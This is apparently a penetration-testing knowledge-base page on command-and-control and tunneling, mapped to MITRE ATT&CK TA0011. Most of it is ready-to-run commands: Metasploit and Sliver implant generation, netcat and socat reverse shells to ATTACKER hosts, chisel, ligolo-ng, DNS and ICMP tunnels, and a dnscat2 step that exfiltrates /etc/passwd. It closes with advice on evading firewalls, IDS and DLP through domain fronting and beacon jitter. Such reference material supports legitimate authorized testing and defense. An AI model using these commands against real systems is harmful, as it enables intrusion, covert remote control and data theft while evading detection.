# Command & Control and Tunneling — Deep Dive (TA0011)

> Setting up reliable C2 channels and tunneling through restrictive networks.
> Maps to MITRE ATT&CK TA0011 — Command and Control.

---

## C2 Frameworks

### Metasploit (Classic, Full-Featured)
```bash
# Start handler
msfconsole -q
use exploit/multi/handler

# Reverse TCP (basic)
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
run -j

# Reverse HTTPS (encrypted, harder to detect)
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST ATTACKER_IP
set LPORT 443
set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
run -j

# Stage-less (single payload, more reliable)
set PAYLOAD windows/x64/meterpreter_reverse_https
# Note: meterpreter_reverse_https (no /) = stageless

# Generate matching payloads
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f exe -o shell.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell
```

### Sliver (Modern, Open Source)
```bash
# Install
curl https://sliver.sh/install | sudo bash
# Or: apt install sliver

# Start server
sliver-server

# Generate implants
generate --mtls ATTACKER_IP --os windows --arch amd64 --save implant.exe
generate --http ATTACKER_IP --os linux --arch amd64 --save implant

# Start listener
mtls -l 8888
https -l 443
http -l 80
dns -d c2.yourdomain.com

# Interact with sessions
sessions
use SESSION_ID
```

### Netcat (Simple, Quick)
```bash
# Listener
nc -lvnp PORT
rlwrap nc -lvnp PORT   # With readline (arrow keys work)

# Reverse shells — see knowledge-base/checklists/reverse-shells.md

# Upgrade to stable shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 50 cols 200
```

### Socat (Encrypted, Flexible)
```bash
# Generate certificate for encrypted comms
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem

# Encrypted listener
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,fork EXEC:/bin/bash

# Encrypted reverse shell
socat OPENSSL:ATTACKER:443,verify=0 EXEC:/bin/bash

# Stable TTY over socat
socat file:`tty`,raw,echo=0 TCP-LISTEN:PORT
# On target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:ATTACKER:PORT
```

---

## Tunneling Techniques

### SSH Tunneling (When SSH Access Exists)
```bash
# Local port forward — access internal service from attacker
# "I want to access INTERNAL:80 through PIVOT"
ssh -L 8080:INTERNAL_TARGET:80 user@PIVOT
# Now: http://localhost:8080 → INTERNAL_TARGET:80

# Dynamic SOCKS proxy — access entire internal network
ssh -D 9050 user@PIVOT
# Configure proxychains: socks5 127.0.0.1 9050
proxychains4 nmap -sT INTERNAL_SUBNET/24
proxychains4 firefox  # Browse internal web apps

# Remote port forward — let internal target reach attacker
# "I want PIVOT to forward connections back to me"
ssh -R 4444:localhost:4444 user@PIVOT
# Now: anything connecting to PIVOT:4444 reaches ATTACKER:4444

# Multiple tunnels at once
ssh -L 8080:WEB:80 -L 1433:SQL:1433 -D 9050 user@PIVOT
```

### Chisel (No SSH Required)
```bash
# On attacker (server):
chisel server -p 8080 --reverse

# On target (client) — SOCKS proxy:
chisel client ATTACKER:8080 R:socks
# Default: socks5 on ATTACKER:1080
# Configure proxychains: socks5 127.0.0.1 1080

# Port forward:
chisel client ATTACKER:8080 R:LOCAL_PORT:INTERNAL_TARGET:REMOTE_PORT

# Example: forward internal web server
chisel client ATTACKER:8080 R:8888:10.10.10.5:80
# Now: http://ATTACKER:8888 → 10.10.10.5:80

# Reverse port forward (target → attacker):
chisel client ATTACKER:8080 9999:127.0.0.1:9999
```

### Ligolo-ng (VPN-Like, Best for Networks)
```bash
# On attacker:
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# On target:
./ligolo-agent -connect ATTACKER:11601 -retry -ignore-cert

# In ligolo proxy console:
> session                    # Select session
> ifconfig                   # See target's interfaces
> start                      # Start the tunnel

# Route internal network through ligolo
sudo ip route add 10.10.10.0/24 dev ligolo
# Now you can directly ping/scan/connect to 10.10.10.0/24!

# Add listener for reverse shell relay
> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
# Reverse shells connecting to PIVOT:4444 arrive at ATTACKER:4444

# Double pivot (target1 → target2)
# On target2: ./ligolo-agent -connect PIVOT1_INTERNAL_IP:11601
```

### DNS Tunneling (Bypass Most Firewalls)
```bash
# dnscat2 (encrypted DNS tunnel)
# On attacker (need DNS server/domain pointing to you):
dnscat2-server YOURDOMAIN.COM
# Or without a domain:
dnscat2-server --dns "host=0.0.0.0,port=53"

# On target:
./dnscat YOURDOMAIN.COM
# Or direct:
./dnscat --dns "host=ATTACKER_IP,port=53"

# In dnscat2 server:
> sessions
> session -i 1
> shell       # Get a shell
> download /etc/passwd  # Exfiltrate files

# iodine (DNS tunnel for IP traffic)
# On attacker:
iodined -f 10.0.0.1 YOURDOMAIN.COM
# On target:
iodine -f YOURDOMAIN.COM
# Creates a network tunnel over DNS — route traffic through it
```

### ICMP Tunneling (When DNS/TCP Blocked)
```bash
# icmpsh (ICMP reverse shell)
# On attacker:
sysctl -w net.ipv4.icmp_echo_ignore_all=1
python3 icmpsh_m.py ATTACKER_IP TARGET_IP

# On target:
icmpsh.exe -t ATTACKER_IP

# ptunnel-ng (ICMP tunnel for TCP)
# On attacker:
ptunnel-ng -r ATTACKER_IP -R 22
# On target:
ptunnel-ng -p ATTACKER_IP -l 8888 -r ATTACKER_IP -R 22
# Now: ssh -p 8888 user@127.0.0.1 (tunneled over ICMP)
```

---

## Firewall Bypass Strategies

```
Outbound TCP blocked      → Try DNS (53/udp) → ICMP → HTTP/HTTPS on allowed ports
Only HTTP/HTTPS allowed   → Reverse HTTPS shell → HTTP tunnel → Websocket tunnel
DNS only                  → dnscat2 → iodine → DNS-over-HTTPS
All outbound blocked      → Bind shell (if inbound allowed) → Physical access needed
                          → Check if any cloud services are whitelisted (S3, Azure, etc.)
Proxy required            → Configure C2 to use proxy → Use proxy-aware payloads
                          → msfvenom: set HttpProxyHost/HttpProxyPort
IDS/DLP inspecting        → Encrypted channels → Domain fronting → Jitter/sleep in C2
```

---

## Operational Tips

1. **Use encrypted channels** — Always prefer HTTPS/TLS/encrypted DNS over plaintext
2. **Jitter your callbacks** — Random sleep intervals look less like beacons
3. **Match legitimate traffic** — Use common User-Agents, standard ports, normal-looking domains
4. **Have backup channels** — If primary C2 dies, have a secondary (different protocol)
5. **Kill switch** — Be able to shut down all implants quickly
6. **Test before deploying** — Verify your tunnel/C2 works in a lab first
7. **Log everything** — Keep records of all C2 sessions and commands for the report
